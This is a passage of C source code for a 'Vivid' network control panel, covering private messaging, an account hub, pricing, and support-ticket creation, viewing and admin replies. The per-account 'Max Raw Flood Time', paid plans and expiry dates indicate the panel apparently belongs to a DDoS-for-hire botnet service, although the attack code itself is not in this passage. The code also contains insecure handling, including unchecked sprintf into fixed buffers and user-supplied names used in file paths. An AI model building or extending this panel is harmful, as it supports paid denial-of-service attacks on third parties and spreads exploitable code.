            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(pmuser, 0, sizeof(pmuser));
            memset(privmsg, 0, sizeof(privmsg));
            sent = 0;
        }
        else if(!sent){
            sprintf(vivid, ""R"Couldn't Find \x1b[33m%s"W"\r\n", pmuser);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(pmuser, 0, sizeof(pmuser));
            memset(privmsg, 0, sizeof(privmsg));
        }
        memset(buf, 0, sizeof(buf));
        dmwt:
        sprintf(vivid, ""CR"« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b"))
            goto chatlobby;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")){
            MNGRS[vivfd].chat = 0;
            goto goodbye;
        }
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto dmwt;
        }

        accounthub: ;
        sprintf(vivid, ""CLS"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, acnt, strlen(acnt), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\t"VIVY""Y"--- "CY"Current Account Statistics "Y"---"VIVY""W"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\t"VIVY" "CY"Account Expiry - "Y"%s"W"\r\n", MNGRS[vivfd].vivex);
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\t"VIVY" "CY"Max Raw Flood Time - "Y"%d"W"\r\n", MNGRS[vivfd].vivscs);
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "T") || !strcmp(buf, "t")){
            char acc_subject[500];
            char acc_inquiry[500];
            memset(buf, 0, sizeof(buf));
            accsubwt:
            memset(acc_subject, 0, sizeof(acc_subject));
            sprintf(vivid, "\r\n"Y"["CY"Ticket Subject("Y"Upgrade"CY"/"Y"Renewal"CY")"Y"]"CY": ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(acc_subject, sizeof acc_subject, vivfd) < 1) goto end;
            Trim(acc_subject);
            if(!strcmp(acc_subject, "Upgrade") || !strcmp(acc_subject, "Renewal") || !strcmp(acc_subject, "upgrade") || !strcmp(acc_subject, "renewal")){
                    //Do Nothing, Straight Logic
            }
            else{
                sprintf(vivid, ""R"Enter Either "Y"'Upgrade' "R"Or "Y"'Renewal'"R"..."CR"\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                goto accsubwt;
            }
            acissuewt:
            memset(acc_inquiry, 0, sizeof(acc_inquiry));
            sprintf(vivid, ""Y"*"CY"Include Your Desired Plan"Y"/"CY"Account Stats Below"Y"*\r\n"Y"["CY"Inquiry"Y"]"CY": ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(acc_inquiry, sizeof acc_inquiry, vivfd) < 1) goto end;
            Trim(acc_inquiry);
            if(strlen(acc_inquiry) < 3) goto acissuewt;
            int c, t_id;
            for(c = 1; c <= 1000; c++)
                t_id = rand() % 10000 + 1;
            char t_id_check[50];
            sprintf(t_id_check, "%d", t_id);
            struct dirent *de;
            DIR *dr = opendir(""LFD"/SupportTickets/PLANS/"); 
            while ((de = readdir(dr)) != NULL){ 
                if(!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                    //Do Nothing, Straight Logic
                }
                if(strstr(de->d_name, t_id_check)){
                    t_id = t_id + 7;
                }
            }
            closedir(dr);
            memset(t_id_check, 0, sizeof(t_id_check));
            char new_ticket_file[0x100];
            snprintf(new_ticket_file, sizeof(new_ticket_file), ""LFD"/SupportTickets/PLANS/OPEN-%d-%s.txt", t_id, MNGRS[vivfd].nick);
            Trim(new_ticket_file);

            time_t t = time(NULL);
            struct tm tm = *localtime(&t);
            FILE *nwtkf = fopen(new_ticket_file, "w");
            fprintf(nwtkf, ""Y"["CY"%d/%d/%d %d:%d:%d"Y"]\n"CY"User:"Y"%s\n"CY"Ticket ID:"Y"%d\n"CY"Subject:"Y"%s\n"CY"Inquiry:"Y"%s\n"CY"Status: "Y"OPEN"CR"\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, MNGRS[vivfd].nick, t_id, acc_subject, acc_inquiry);
            fclose(nwtkf);
            printf(""Y"[TICKET] %s Created An Account Ticket! (Subject:%s) [TICKET]\n", MNGRS[vivfd].nick, acc_subject);
            memset(new_ticket_file, 0, sizeof(new_ticket_file));
            memset(acc_subject, 0, sizeof(acc_subject));
            memset(acc_inquiry, 0, sizeof(acc_inquiry));
            sprintf(vivid, ""CLS"\r\n\t\t"CY"["G"Ticket Created "CY"- "Y"ID#%d"CY"]\r\n\t"Y"*"CY"Please, Allow Up To 24 Hours For A Response"Y"*\r\n\t"Y"To View Your Tickets, Re-Visit The Account Hub\r\n\t "CY"You Will See Your Ticket As ("Y"OPEN-ID#-User"CY")\r\n  "Y"*"CY"When A Response Has Been Made, The File Will Be Renamed ("Y"CLOSED-ID#-User"CY")"Y"*\r\n", t_id);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            actkcrtwt:
            sprintf(vivid, "\r\n\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto accounthub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto actkcrtwt;
            }
        }
        else if(!strcmp(buf, "C") || !strcmp(buf, "c")){
            //Check Ticket Status
            unsigned int mytickets = 0;
            unsigned int needresponses = 0;
            struct dirent *de;
            DIR *dr = opendir(""LFD"/SupportTickets/PLANS/"); 
            if(MNGRS[vivfd].vivadm == 1){
                sprintf(vivid, "\r\n\t\t\t"UND"Open Tickets(Need Responses)"NUND":\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            else{
                sprintf(vivid, "\r\n\t\t\t"UND"Your Account Hub Tickets"NUND":\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            while ((de = readdir(dr)) != NULL){ 
                if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                    //Do Nothing, Straight Logic
                }
                else{
                    if(MNGRS[vivfd].vivadm == 1){
                        if(strstr(de->d_name, "OPEN") && !strstr(de->d_name, "CLOSED")){
                            sprintf(vivid, "\t\t\t"Y"%s\r\n", de->d_name);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            needresponses ++;
                        }
                    }
                    else{
                        if(strstr(de->d_name, MNGRS[vivfd].nick)){
                            sprintf(vivid, "\t\t\t"Y"%s\r\n", de->d_name);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            mytickets ++;
                        }
                    }
                }
            }
            closedir(dr);
            if(mytickets == 0 && MNGRS[vivfd].vivadm == 0){
                sprintf(vivid, "\t\t"Y"You Do Not Have Any Open Account Tickets!\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            else if(needresponses == 0 && MNGRS[vivfd].vivadm == 1){
                sprintf(vivid, "\t\t"Y"There Are No Open Account Tickets!\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            unsigned int viewstatus = 0;
            if(mytickets > 0 || needresponses > 0){
                sprintf(vivid, "\t\t\t"CY"╔═════════════════╗\r\n\t\t\t║ "Y"V.View A Ticket "CY"║\r\n\t\t\t╚═════════════════╝"CR"\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                viewstatus = 1;
            }
            shwacctkts:
            sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "V") || !strcmp(buf, "v") && viewstatus == 1){
                if(MNGRS[vivfd].vivadm == 1){
                    char adtktview[500];
                    adwaitforaccticket:
                    sprintf(vivid, ""Y"["CY"Ticket ID# To View("Y"Ex: 5045"CY")"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(vivid, 0, sizeof(vivid));
                    if(fdgets(adtktview, sizeof adtktview, vivfd) < 1) goto end;
                    Trim(adtktview);
                    //printf("Admin Is Viewing Ticket %s\n", adtktview);
                    char tktarg[100];
                    DIR *dr = opendir(""LFD"/SupportTickets/PLANS/"); 
                    while ((de = readdir(dr)) != NULL){ 
                        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                            //Do Nothing, Straight Logic
                        }
                        else{
                            if(strstr(de->d_name, adtktview)){
                                if(strstr(de->d_name, "OPEN") && !strstr(de->d_name, "CLOSED")){
                                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                                    sprintf(tktarg, "%s", de->d_name);
                                }
                            }
                        }
                    }
                    char tkttoview[0x500];
                    snprintf(tkttoview, sizeof(tkttoview), ""LFD"/SupportTickets/PLANS/%s", tktarg);
                    FILE *stream;
                    char *line = NULL;
                    size_t len = 0;
                    ssize_t read;
                    stream = fopen(tkttoview, "r");
                    if(stream == NULL){
                        sprintf(vivid, ""R"That Ticket Doesn't Exist..."CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(adtktview, 0, sizeof(adtktview));
                        goto adwaitforaccticket;
                    }
                    if(send(vivfd, "\r\n\r\n"Y"", strlen("\r\n\r\n"Y""), MSG_NOSIGNAL) == -1) goto end;
                    while((read = getline(&line, &len, stream)) != -1) {
                        sprintf(vivid, "%s\r", line);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    free(line);
                    fclose(stream);
                    sprintf(vivid, "\r\n\t    "Y"*Do Not Respond Unless Authorized!*\r\n\tWould You Like To Reply To This Ticket?(y/n): ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "Y") || !strcmp(buf, "y")){
                        //Reply To Ticket
                        char tktresp[500];
                        getaccresponse:
                        sprintf(vivid, "\r\n"Y"["CY"Response"Y"]"CY": ");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(tktresp, sizeof tktresp, vivfd) < 1) goto end;
                        Trim(tktresp);
                        if(strlen(tktresp) < 3){
                            sprintf(vivid, ""R"Response Is Too Short"CR"");
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            memset(tktresp, 0, sizeof(tktresp));
                            goto getaccresponse;
                        }
                        time_t t = time(NULL);
                        struct tm tm = *localtime(&t);
                        FILE *resptkf = fopen(tkttoview, "a");
                        fprintf(resptkf, "\n\n"Y"["CY"%d/%d/%d %d:%d:%d"Y"]\n"CY"Response From:"Y"%s\n"CY"RE:"Y"%s\n"CY"Response:"Y"%s\n"CY"Status: "Y"CLOSED"CR"\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, MNGRS[vivfd].nick, adtktview, tktresp);
                        fclose(resptkf);
                        Split_Str(tktarg);
                        // Path to old and new files
                        char oldName[0x100], newName[0x100];
                        snprintf(oldName, sizeof(oldName), "%s", tkttoview);
                        snprintf(newName, sizeof(newName), ""LFD"/SupportTickets/PLANS/CLOSED-%s-%s", adtktview, split_argv[2]);
                        if(rename(oldName, newName) == 0){
                            sprintf(vivid, "\r\n\t"CY"["Y"%s"CY"] "Y"Replied To Ticket "CY"["Y"%s"CY"]"CR"\r\n", MNGRS[vivfd].nick, adtktview);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        }
                        else{
                            sprintf(vivid, "\r\n"R"Couldn't Rename Ticket, Please Contact An Owner!"CR"\r\n");
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        }
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(adtktview, 0, sizeof(adtktview));
                        memset(tktresp, 0, sizeof(tktresp));
                        memset(oldName, 0, sizeof(oldName));
                        memset(newName, 0, sizeof(newName));
                        aftrepaccwt:
                        sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                        Trim(buf);
                        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto accounthub;
                        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                        else{
                            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            memset(buf, 0, sizeof(buf));
                            sleep(1);
                            goto aftrepaccwt;
                        }
                    }
                    else{
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(buf, 0, sizeof(buf));
                        goto accounthub;
                    }
                }
                else{
                    char rgacctktview[500];
                    rgwaitforaccticket:
                    sprintf(vivid, ""Y"["CY"Ticket ID# To View("Y"Ex: 5045"CY")"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(vivid, 0, sizeof(vivid));
                    if(fdgets(rgacctktview, sizeof rgacctktview, vivfd) < 1) goto end;
                    Trim(rgacctktview);
                    //printf("User Is Viewing Ticket %s\n", rgacctktview);
                    char tktarg[100];
                    DIR *dr = opendir(""LFD"/SupportTickets/PLANS/"); 
                    while ((de = readdir(dr)) != NULL){ 
                        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                            //Do Nothing, Straight Logic
                        }
                        else{
                            if(strstr(de->d_name, MNGRS[vivfd].nick)){
                                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                                sprintf(tktarg, "%s", de->d_name);
                            }
                        }
                    }
                    char tkttoview[0x500];
                    snprintf(tkttoview, sizeof(tkttoview), ""LFD"/SupportTickets/PLANS/%s", tktarg);
                    FILE *stream;
                    char *line = NULL;
                    size_t len = 0;
                    ssize_t read;
                    stream = fopen(tkttoview, "r");
                    if(stream == NULL){
                        sprintf(vivid, ""R"That Ticket Doesn't Exist..."CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(rgacctktview, 0, sizeof(rgacctktview));
                        goto rgwaitforaccticket;
                    }
                    if(send(vivfd, "\r\n\r\n"Y"", strlen("\r\n\r\n"Y""), MSG_NOSIGNAL) == -1) goto end;
                    while((read = getline(&line, &len, stream)) != -1) {
                        sprintf(vivid, "%s\r", line);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    free(line);
                    fclose(stream);
                    aftraccvwwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto accounthub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto aftraccvwwt;
                    }
                }
            } 
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto accounthub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto shwacctkts;
            } 
        }
        else if(!strcmp(buf, "P") || !strcmp(buf, "p")){
            prcwt:
            if(send(vivfd, pricing, strlen(pricing), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "« B.Go Back\r\n« L.Log Out\r\n\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b"))
                goto accounthub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l"))
                goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto prcwt;
            }
        }
        else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto homescreen;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto accounthub;
        }

        helpcenter:
        sprintf(vivid, ""CR""CLS"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, ntown, strlen(ntown), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, cntin, strlen(cntin), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\r\n"Y"*"CY"Response Hours Are From 9-5"Y"*"CR"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(send(vivfd, hlp, strlen(hlp), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\t\t\t"Y"*"CY"Help Center Tickets ONLY"Y"*\r\n\t"Y"*"CY"For Plan Upgrades/Renewal, Visit The Account Hub And Open A Ticket"Y"*"CR"\r\n");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        memset(buf, 0, sizeof(buf));
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "T") || !strcmp(buf, "t")){
            char help_subject[500];
            char help_inquiry[500];
            memset(buf, 0, sizeof(buf));
            sprintf(vivid, "\r\n"Y"["CY"Ticket Subject"Y"]"CY": ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(help_subject, sizeof help_subject, vivfd) < 1) goto end;
            Trim(help_subject);
            issuewt:
            memset(help_inquiry, 0, sizeof(help_inquiry));
            sprintf(vivid, ""Y"["CY"Issue"Y"]"CY": ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(help_inquiry, sizeof help_inquiry, vivfd) < 1) goto end;
            Trim(help_inquiry);
            if(strlen(help_inquiry) < 3) goto issuewt;
            int c, t_id;
            for(c = 1; c <= 1000; c++)
                t_id = rand() % 10000 + 1;
            char t_id_check[50];
            sprintf(t_id_check, "%d", t_id);
            struct dirent *de;
            DIR *dr = opendir(""LFD"/SupportTickets/HELP/"); 
            while ((de = readdir(dr)) != NULL){ 
                if(!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                    //Do Nothing, Straight Logic
                }
                if(strstr(de->d_name, t_id_check)){
                    t_id = t_id + 7;
                }
            }
            closedir(dr);
            memset(t_id_check, 0, sizeof(t_id_check));
            char new_ticket_file[0x100];
            snprintf(new_ticket_file, sizeof(new_ticket_file), ""LFD"/SupportTickets/HELP/OPEN-%d-%s.txt", t_id, MNGRS[vivfd].nick);
            Trim(new_ticket_file);
            time_t t = time(NULL);
            struct tm tm = *localtime(&t);
            FILE *nwtkf = fopen(new_ticket_file, "w");
            fprintf(nwtkf, ""Y"["CY"%d/%d/%d %d:%d:%d"Y"]\n"CY"User:"Y"%s\n"CY"Ticket ID:"Y"%d\n"CY"Subject:"Y"%s\n"CY"Issue:"Y"%s\n"CY"Status: "Y"OPEN"CR"\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, MNGRS[vivfd].nick, t_id, help_subject, help_inquiry);
            fclose(nwtkf);
            printf(""Y"[TICKET] %s Created A Help Ticket! (Subject:%s) [TICKET]\n", MNGRS[vivfd].nick, help_subject);
            memset(new_ticket_file, 0, sizeof(new_ticket_file));
            memset(help_subject, 0, sizeof(help_subject));
            memset(help_inquiry, 0, sizeof(help_inquiry));
            sprintf(vivid, ""CLS"\r\n\t\t"CY"["G"Ticket Created "CY"- "Y"ID#%d"CY"]\r\n\t"Y"*"CY"Please, Allow Up To 24 Hours For A Response"Y"*\r\n\t"Y"To View Your Tickets, Re-Visit The Help Center\r\n\t "CY"You Will See Your Ticket As ("Y"OPEN-ID#-User"CY")\r\n  "Y"*"CY"When A Response Has Been Made, The File Will Be Renamed ("Y"CLOSED-ID#-User"CY")"Y"*\r\n", t_id);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            tkcrtwt:
            sprintf(vivid, "\r\n\r\n"CR"« B.Go Back\r\n« L.Log Out\r\n\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto helpcenter;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto tkcrtwt;
            }
        }
        else if(!strcmp(buf, "C") || !strcmp(buf, "c")){
            //Check Ticket Status
            unsigned int mytickets = 0;
            unsigned int needresponses = 0;
            struct dirent *de;
            DIR *dr = opendir(""LFD"/SupportTickets/HELP/"); 
            if(MNGRS[vivfd].vivadm == 1){
                sprintf(vivid, "\r\n    \t\t"UND"Open Tickets(Need Responses)"NUND":\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            else{
                sprintf(vivid, "\r\n\t\t\t"UND"Your Help Center Tickets"NUND":\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            while ((de = readdir(dr)) != NULL){ 
                if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                    //Do Nothing, Straight Logic
                }
                else{
                    if(MNGRS[vivfd].vivadm == 1){
                        if(strstr(de->d_name, "OPEN") && !strstr(de->d_name, "CLOSED")){
                            sprintf(vivid, "\t\t\t"Y"%s\r\n", de->d_name);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            needresponses ++;
                        }
                    }
                    else{
                        if(strstr(de->d_name, MNGRS[vivfd].nick)){
                            sprintf(vivid, "\t\t\t"Y"%s\r\n", de->d_name);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            mytickets ++;
                        }
                    }
                }
            }
            closedir(dr);
            if(mytickets == 0 && MNGRS[vivfd].vivadm == 0){
                sprintf(vivid, "\t\t"Y"You Do Not Have Any Open Help Tickets!\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            else if(needresponses == 0 && MNGRS[vivfd].vivadm == 1){
                sprintf(vivid, "\t\t"Y"There Are No Open Help Tickets!\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            unsigned int viewstatus = 0;
            if(mytickets > 0 || needresponses > 0){
                sprintf(vivid, "\t\t\t"CY"╔═════════════════╗\r\n\t\t\t║ "Y"V.View A Ticket "CY"║\r\n\t\t\t╚═════════════════╝"CR"\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                viewstatus = 1;
            }
            shwhlptkts:
            sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "V") || !strcmp(buf, "v") && viewstatus == 1){
                if(MNGRS[vivfd].vivadm == 1){
                    char adtktview[500];
                    adwaitforhelpticket:
                    sprintf(vivid, ""Y"["CY"Ticket ID# To View("Y"Ex: 5045"CY")"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(vivid, 0, sizeof(vivid));
                    if(fdgets(adtktview, sizeof adtktview, vivfd) < 1) goto end;
                    Trim(adtktview);
                    //printf("Admin Is Viewing Ticket %s\n", adtktview);
                    char tktarg[100];
                    DIR *dr = opendir(""LFD"/SupportTickets/HELP/"); 
                    while ((de = readdir(dr)) != NULL){ 
                        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                            //Do Nothing, Straight Logic
                        }
                        else{
                            if(strstr(de->d_name, adtktview)){
                                if(strstr(de->d_name, "OPEN") && !strstr(de->d_name, "CLOSED")){
                                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                                    sprintf(tktarg, "%s", de->d_name);
                                }
                            }
                        }
                    }
                    char tkttoview[0x500];
                    snprintf(tkttoview, sizeof(tkttoview), ""LFD"/SupportTickets/HELP/%s", tktarg);
                    FILE *stream;
                    char *line = NULL;
                    size_t len = 0;
                    ssize_t read;
                    stream = fopen(tkttoview, "r");
                    if(stream == NULL){
                        sprintf(vivid, ""R"That Ticket Doesn't Exist..."CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(adtktview, 0, sizeof(adtktview));
                        goto adwaitforhelpticket;
                    }
                    if(send(vivfd, "\r\n\r\n"Y"", strlen("\r\n\r\n"Y""), MSG_NOSIGNAL) == -1) goto end;
                    while((read = getline(&line, &len, stream)) != -1) {
                        sprintf(vivid, "%s\r", line);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    free(line);
                    fclose(stream);
